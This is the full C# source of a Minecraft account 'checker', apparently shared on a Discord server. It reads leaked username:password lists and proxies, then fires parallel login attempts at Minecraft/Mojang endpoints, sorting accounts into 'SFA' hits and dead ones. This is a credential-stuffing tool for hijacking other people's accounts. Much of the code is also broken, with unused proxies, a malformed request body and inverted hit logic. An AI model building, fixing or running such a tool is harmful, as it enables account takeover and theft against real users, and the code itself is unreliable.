using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Net;

namespace Lousand_checker_v1._0
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args is null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            System.Net.CookieContainer myCookies = new System.Net.CookieContainer();


            Console.Title = "Lousand Checker v1.0 By zDouwin_#7460 |";

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("|        ____           ___                                    _____    ");
            Console.WriteLine("|       |    |  |    | |           ____        __       _      |    /   ");
            Console.WriteLine("|       |    |  |    | |          /    /      | /|       | /   |     /   ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("|       |    |  |    | |____    /      /     | / /|     | /   |     |   ");
            Console.WriteLine("|       |    |  |    |     |   /   __   /    | /  /|   | /    |     /   ");
            Console.WriteLine("|______ |____|  |____| ____|  /   |__|   /   | /   /|_| /     |____/    ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Discord | " + "https://discord.gg/f4HgAwg");
            Console.WriteLine("Threads :");
            int Threads = Convert.ToInt32(Console.ReadLine());
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("|        ____           ___                                    _____    ");
            Console.WriteLine("|       |    |  |    | |           ____        __       _      |    /   ");
            Console.WriteLine("|       |    |  |    | |          /    /      | /|       | /   |     /   ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("|       |    |  |    | |____    /      /     | / /|     | /   |     |   ");
            Console.WriteLine("|       |    |  |    |     |   /   __   /    | /  /|   | /    |     /   ");
            Console.WriteLine("|______ |____|  |____| ____|  /   |__|   /   | /   /|_| /     |____/    ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Discord | " + "https://discord.gg/f4HgAwg");
            Console.WriteLine("Threads:" + Threads);

            Console.WriteLine("Proxies type (HTTP, SOCKS4, SOCKS5) :");
            string proxiesType = Console.ReadLine().ToUpper();
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("|        ____           ___                                    _____    ");
            Console.WriteLine("|       |    |  |    | |           ____        __       _      |    /   ");
            Console.WriteLine("|       |    |  |    | |          /    /      | /|       | /   |     /   ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("|       |    |  |    | |____    /      /     | / /|     | /   |     |   ");
            Console.WriteLine("|       |    |  |    |     |   /   __   /    | /  /|   | /    |     /   ");
            Console.WriteLine("|______ |____|  |____| ____|  /   |__|   /   | /   /|_| /     |____/    ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Discord | " + "https://discord.gg/f4HgAwg");
            Console.WriteLine("Threads | " + Threads);
            Console.WriteLine("Proxies Type | " + proxiesType);

            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("|        ____           ___                                    _____    ");
            Console.WriteLine("|       |    |  |    | |           ____        __       _      |    /   ");
            Console.WriteLine("|       |    |  |    | |          /    /      | /|       | /   |     /   ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("|       |    |  |    | |____    /      /     | / /|     | /   |     |   ");
            Console.WriteLine("|       |    |  |    |     |   /   __   /    | /  /|   | /    |     /   ");
            Console.WriteLine("|______ |____|  |____| ____|  /   |__|   /   | /   /|_| /     |____/    ");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("");
            Console.WriteLine("| Discord | " + "https://discord.gg/f4HgAwg");
            Console.WriteLine("| Threads | " + Threads);
            Console.WriteLine("| Proxies Type | " + proxiesType);
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("");
            Thread.Sleep(1000);
            Console.WriteLine("Importing accounts lines...");
            Thread.Sleep(1405);
            Console.WriteLine("Importing proxies lines...");
            Console.WriteLine("");
            Thread.Sleep(2506);
            Console.WriteLine("");
            Console.WriteLine("LOADING......");
            Console.WriteLine("");

            List<Task> tasklist = new List<Task>();

            List<string> accounts = new List<string>(File.ReadLines("accounts.txt"));
            List<string> proxies = File.ReadAllLines("proxies.txt").ToList();

            //Variables para las accounts

            int checkeds = 0;
            int hits = 0;
            int deads = 0;
            int Remaing = 0;
            Remaing = accounts.Count - checkeds;

            //CODIGO PARA HACER LA HROA 

            int hrs, min, seg;
            for (hrs = 0; hrs < 24; hrs++)
            {
                for (min = 0; min < 60; min++)
                {
                    for (seg = 0; seg < 60; seg++)
                    {

                        Console.Title = "PitufiChecker v1.0 By zDouwin_#7460 |" + "(" + checkeds + "/" + accounts.Count + ")" + " | Hits: " + hits + " | Deads: " + deads + " | Remaing: " + Remaing + " / " + " Elapsed: " + hrs + " : " + min + " : " + seg;
                        Thread.Sleep(1000);


                        Parallel.ForEach(accounts, new ParallelOptions { MaxDegreeOfParallelism = Threads }, account =>
                        {
                            if (account.Split(':').Length == 2)
                            {
                                string username = account.Split(':')[0];
                                string password = account.Split(':')[1];

                                {

                                    System.Net.CookieContainer cookies = new System.Net.CookieContainer();




                                    string postData = "password: " + password + "&requestUsaer: " + "true" + "&username: " + username + "&form=submit";


                                    bool result = HttpMethods.Post("https://my.minecraft.net/es-es/login/", postData, "https://authserver.mojang.com/authenticate", cookies);
                                    //string mySrc = HttpMethods.Get("https://my.minecraft.net/es-es/profile/", "https://my.minecraft.net/es-es/profile/", ref myCookies);



                                    ///////////////////////////////////////////////////////////////////////
                                    //  https://my.minecraft.net/es-es/profile/                         //
                                    //  https://my.minecraft.net/es-es/login/                          //
                                    //  https://api.mojang.com/user/security/challenges               //
                                    //  https://authserver.mojang.com/authenticate                   //
                                    //  https://my.minecraft.net                                    //
                                    //  https://my.minecraft.net/es-es/login/?return_url=/profile  //
                                    //                                                            //
                                    ///////////////////////////////////////////////////////////////


                                    string url = "https://my.minecraft.net/es-es/profile/";
                                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);

                                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())


                                    {
                                        cookies.Add(resp.Cookies);

                                        StreamReader streamReader = new StreamReader(resp.GetResponseStream());
                                        StreamReader sr = streamReader;

                                        string pageSrc = sr.ReadToEnd();

                                        //Console.WriteLine(pageSrc);


                                        string keysfa = "Fecha de registro (UTC)";
                                        if (!result == pageSrc.Contains(keysfa))
                                        {
                                            Console.ForegroundColor = ConsoleColor.Cyan;
                                            Console.WriteLine("[SFA]" + account);
                                            Interlocked.Increment(ref hits);
                                            Interlocked.Increment(ref checkeds);
                                            Interlocked.Increment(ref Remaing);
                                        }
                                        else
                                        {
                                            Console.ForegroundColor = ConsoleColor.Red;
                                            Console.WriteLine("[DEAD]" + account);
                                            Interlocked.Increment(ref deads);
                                            Interlocked.Increment(ref checkeds);
                                            Interlocked.Increment(ref Remaing);
                                        }
                                        //

                                        //
                                        Thread.Sleep(new Random().Next(600, 15500));

                                    }
                                }



                            }
                        });
                    }
                }
            }



        }
    }
}

